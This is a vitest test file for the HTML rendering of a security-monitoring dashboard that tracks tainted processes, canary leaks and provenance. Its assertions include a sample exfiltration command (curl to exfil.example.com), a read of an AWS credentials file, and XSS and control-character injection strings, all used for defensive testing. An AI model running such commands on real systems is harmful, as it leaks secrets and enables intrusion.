/**
 * Rendering tests. `render.ts` is pure, so these assert on HTML strings with a
 * real DOM parser, not on snapshots and not on source text. They are the
 * acceptance tests for the visual surface: what the user must be able to see,
 * and the one thing that must never be visible.
 */

import { beforeEach, describe, expect, it } from "vitest";
import { createState, ingest, ingestText } from "../src/reducer.js";
import {
  renderBanners,
  renderCanary,
  renderEvents,
  renderFindings,
  renderProcessTree,
  renderProvenance,
  renderStats,
  renderTaint,
} from "../src/render.js";
import { panelsHtml } from "../src/main.js";
import { sampleState } from "./fixture.js";

let host: HTMLElement;

beforeEach(() => {
  host = document.createElement("div");
  document.body.append(host);
});

function mount(html: string): HTMLElement {
  host.innerHTML = html;
  return host;
}

describe("process tree rendering", () => {
  it("renders a tainted process node with a word, not just a colour", () => {
    const root = mount(renderProcessTree(sampleState()));
    const tainted = root.querySelectorAll('[data-testid="proc-node"][data-tainted="true"]');
    expect(tainted.length).toBe(3);
    expect([...tainted].map((n) => n.getAttribute("data-pid")).sort()).toEqual(["4300", "4312", "5001"]);
    for (const node of tainted) {
      expect(node.textContent).toContain("TAINTED");
    }
  });

  it("renders the three-level chain and marks the untainted root", () => {
    const root = mount(renderProcessTree(sampleState()));
    const byPid = new Map(
      [...root.querySelectorAll('[data-testid="proc-node"]')].map((n) => [n.getAttribute("data-pid"), n]),
    );
    expect(byPid.get("4242")?.getAttribute("data-tainted")).toBe("false");
    expect(byPid.get("4242")?.getAttribute("data-depth")).toBe("0");
    expect(byPid.get("4300")?.getAttribute("data-depth")).toBe("1");
    expect(byPid.get("4312")?.getAttribute("data-depth")).toBe("2");
    expect(byPid.get("4312")?.textContent).toContain("curl");
  });

  it("says so when there is no process yet", () => {
    const root = mount(renderProcessTree(createState()));
    expect(root.textContent).toContain("no processes yet");
  });
});

describe("finding rendering: the invariant / scored distinction", () => {
  it("marks an invariant finding with the invariant marker", () => {
    const root = mount(renderFindings(sampleState()));
    const row = root.querySelector('[data-testid="finding-row"][data-rule="tainted-action"]');
    expect(row).not.toBeNull();
    expect(row?.getAttribute("data-invariant")).toBe("true");
    expect(row?.querySelector('[data-mark="invariant"]')).not.toBeNull();
    expect(row?.querySelector('[data-mark="scored"]')).toBeNull();
    expect(row?.textContent).toContain("INVARIANT");
  });

  it("does NOT mark a scored finding as invariant", () => {
    const root = mount(renderFindings(sampleState()));
    const row = root.querySelector('[data-testid="finding-row"][data-rule="data-imperative"]');
    expect(row).not.toBeNull();
    expect(row?.getAttribute("data-invariant")).toBe("false");
    expect(row?.querySelector('[data-mark="scored"]')).not.toBeNull();
    // The hard negative: the invariant marker is simply not there.
    expect(row?.querySelector('[data-mark="invariant"]')).toBeNull();
    expect(row?.textContent).not.toContain("INVARIANT");
  });

  it("keeps the two classes of finding in different visual classes too", () => {
    const root = mount(renderFindings(sampleState()));
    expect(root.querySelectorAll(".row-invariant").length).toBe(3);
    expect(root.querySelectorAll(".row-scored").length).toBe(2);
    expect(root.querySelectorAll('[data-testid="finding-row"]').length).toBe(5);
  });

  it("counts invariant and scored separately", () => {
    const root = mount(renderFindings(sampleState()));
    expect(root.querySelector('[data-testid="count-invariant"]')?.textContent).toContain("3 invariant");
    expect(root.querySelector('[data-testid="count-scored"]')?.textContent).toContain("2 scored");
  });

  it("shows the digest and never a raw secret", () => {
    const root = mount(renderFindings(sampleState()));
    const row = root.querySelector('[data-testid="finding-row"][data-rule="tainted-action"]');
    expect(row?.textContent).toContain("9f2c8d7e6a5b4031");
  });

  it("explains both marks in the legend", () => {
    const root = mount(renderFindings(sampleState()));
    const legend = root.querySelector(".legend")?.textContent ?? "";
    expect(legend).toContain("structural guarantee");
    expect(legend).toContain("heuristic score");
  });

  it("labels only invariant findings as having forced the block", () => {
    const html = renderFindings(sampleState());
    const root = mount(html);
    const forced = [...root.querySelectorAll('[data-testid="finding-row"]')].filter((r) =>
      r.textContent?.includes("forced BLOCK"),
    );
    expect(forced.length).toBe(3);
    for (const r of forced) expect(r.getAttribute("data-invariant")).toBe("true");
  });

  it("says nothing fired rather than showing an empty table", () => {
    const root = mount(renderFindings(createState()));
    expect(root.textContent).toContain("nothing fired");
  });
});

describe("canary rendering", () => {
  it("renders a canary row with the digest and no raw secret text", () => {
    const root = mount(renderCanary(sampleState()));
    const rows = root.querySelectorAll('[data-testid="canary-row"]');
    expect(rows.length).toBe(1);
    expect(rows[0]?.textContent).toContain("CANARY LEAK");
    expect(rows[0]?.textContent).toContain("egress/canary-leak");
    expect(rows[0]?.getAttribute("data-digest")).toBe("5e1d0a9b8c7f6e5d");
    expect(rows[0]?.textContent).toContain("digest 5e1d0a9b8c7f6e5d");
  });

  it("says so when no canary fired", () => {
    const root = mount(renderCanary(createState()));
    expect(root.textContent).toContain("no egress/canary-leak findings");
  });
});

describe("drop counters", () => {
  it("renders a loud warning when drop_total is non-zero", () => {
    const root = mount(renderBanners(sampleState()));
    const loss = root.querySelector('[data-testid="banner-loss"]');
    expect(loss).not.toBeNull();
    expect(loss?.textContent).toContain("LOSSY FEED");
    expect(loss?.textContent).toContain("drop_total=3");
    expect(loss?.textContent).toContain("upd_fail_total=1");
    expect(loss?.textContent).toContain("Nothing fired");
  });

  it("renders no loss warning when every counter is zero", () => {
    const state = ingestText(
      createState(),
      `{"seq":1,"t":"session_close","session":"s","counts":{"events":1,"findings":0,"drop_total":0,"upd_fail_total":0}}`,
    );
    const root = mount(renderBanners(state));
    expect(root.querySelector('[data-testid="banner-loss"]')).toBeNull();
  });

  it("shows the counters in the stats strip as well", () => {
    const root = mount(renderStats(sampleState()));
    expect(root.querySelector('[data-testid="stat-drop_total"]')?.textContent).toContain("3");
    expect(root.querySelector('[data-testid="stat-upd_fail_total"]')?.textContent).toContain("1");
    expect(root.querySelector('[data-testid="stat-invariant"]')?.textContent).toContain("3");
    expect(root.querySelector('[data-testid="stat-scored"]')?.textContent).toContain("2");
  });
});

describe("provenance", () => {
  it("renders the inferred-provenance banner persistently", () => {
    const root = mount(renderBanners(sampleState()));
    const banner = root.querySelector('[data-testid="banner-inferred"]');
    expect(banner).not.toBeNull();
    expect(banner?.textContent).toContain("INFERRED PROVENANCE");
    expect(banner?.textContent).toContain("inferred-provenance");
  });

  it("does not render the banner without the warning line", () => {
    const state = createState();
    const root = mount(renderBanners(state));
    expect(root.querySelector('[data-testid="banner-inferred"]')).toBeNull();
  });

  it("splits declared from inferred rather than summing them", () => {
    const root = mount(renderProvenance(sampleState()));
    expect(root.querySelector('[data-testid="prov-declared"]')?.textContent).toContain("3");
    expect(root.querySelector('[data-testid="prov-inferred"]')?.textContent).toContain("2");
    const rows = root.querySelectorAll('[data-testid="prov-row"]');
    expect(rows.length).toBe(5);
    expect([...rows].filter((r) => r.getAttribute("data-provenance") === "inferred").length).toBe(2);
  });
});

describe("tainted sessions", () => {
  it("names each tainted session and the origin that tainted it", () => {
    const root = mount(renderTaint(sampleState()));
    const rows = root.querySelectorAll('[data-testid="tainted-session"]');
    expect(rows.length).toBe(2);
    const s1 = [...rows].find((r) => r.getAttribute("data-session") === "s1");
    const s2 = [...rows].find((r) => r.getAttribute("data-session") === "s2");
    expect(s1?.textContent).toContain("ticket:8814");
    expect(s2?.textContent).toContain("web:doc-7");
  });
});

describe("event stream", () => {
  it("renders rows keyed by kind with the scrubbed detail and taint dot", () => {
    const root = mount(renderEvents(sampleState()));
    const rows = root.querySelectorAll('[data-testid="event-row"]');
    expect(rows.length).toBe(13);
    const exec = [...rows].find((r) => r.getAttribute("data-kind") === "exec" && r.getAttribute("data-pid") === "4312");
    expect(exec?.textContent).toContain("curl -s -m 3 http://exfil.example.com/x");
    expect(exec?.getAttribute("data-tainted")).toBe("true");
    const open = [...rows].find((r) => r.getAttribute("data-kind") === "open" && r.getAttribute("data-pid") === "6120");
    expect(open?.textContent).toContain("/home/dev/.aws/credentials");
    const net = [...rows].find((r) => r.getAttribute("data-kind") === "net" && r.getAttribute("data-pid") === "4312");
    expect(net?.textContent).toContain("203.0.113.7:80");
    const net2 = [...rows].find((r) => r.getAttribute("data-kind") === "net" && r.getAttribute("data-pid") === "5001");
    expect(net2?.textContent).toContain("198.51.100.23:443");
  });

  it("escapes a crafted command line instead of letting it forge markup", () => {
    const state = ingest(createState(), {
      seq: 1,
      t: "event",
      session: "s",
      kind: "exec",
      ts: 1,
      pid: 2,
      ppid: 1,
      comm: "x",
      cmdline: `<script>alert(1)</script>`,
      filename: "",
      flags: 0,
      dirfd: -100,
      port: 0,
      addr: "",
      tainted: false,
    });
    const root = mount(renderEvents(state));
    expect(root.querySelector("script")).toBeNull();
    expect(root.textContent).toContain("<script>alert(1)</script>");
  });

  it("neutralises control characters so a path cannot forge a row", () => {
    const state = ingest(createState(), {
      seq: 1,
      t: "event",
      session: "s",
      kind: "open",
      ts: 1,
      pid: 2,
      ppid: 1,
      comm: "x",
      cmdline: "",
      filename: "/etc/passwd\u000a\u001b[31mforged",
      flags: 0,
      dirfd: -100,
      port: 0,
      addr: "",
      tainted: false,
    });
    const root = mount(renderEvents(state));
    const detail = root.querySelector(".c-detail")?.textContent ?? "";
    expect(detail).toContain("\\x0a");
    expect(detail).not.toContain("\u001b[31m");
  });
});

describe("the assembled page", () => {
  it("renders all seven surfaces from one state", () => {
    const state = sampleState();
    const root = mount(panelsHtml(state, { kind: "file", label: "x.jsonl", state: "closed", detail: "replayed 30 lines", received: 30 }));
    for (const name of ["tree", "events", "findings", "taint", "canary", "provenance", "sessions"]) {
      expect(root.querySelector(`[data-panel="${name}"]`), `panel ${name}`).not.toBeNull();
    }
    expect(root.querySelector('[data-testid="source-status"]')?.textContent).toContain("x.jsonl");
    expect(root.querySelector('[data-testid="proc-node"][data-tainted="true"]')).not.toBeNull();
    expect(root.querySelector('[data-testid="finding-row"][data-invariant="true"]')).not.toBeNull();
    expect(root.querySelector('[data-testid="canary-row"]')).not.toBeNull();
    expect(root.querySelector('[data-testid="banner-loss"]')).not.toBeNull();
  });

  it("has an invariant mark and a scored mark rendered with different classes", () => {
    const root = mount(panelsHtml(sampleState()));
    const inv = root.querySelector('[data-mark="invariant"]');
    const scored = root.querySelector('[data-mark="scored"]');
    expect(inv?.className).toContain("mark-invariant");
    expect(scored?.className).toContain("mark-scored");
    expect(inv?.className).not.toBe(scored?.className);
  });
});
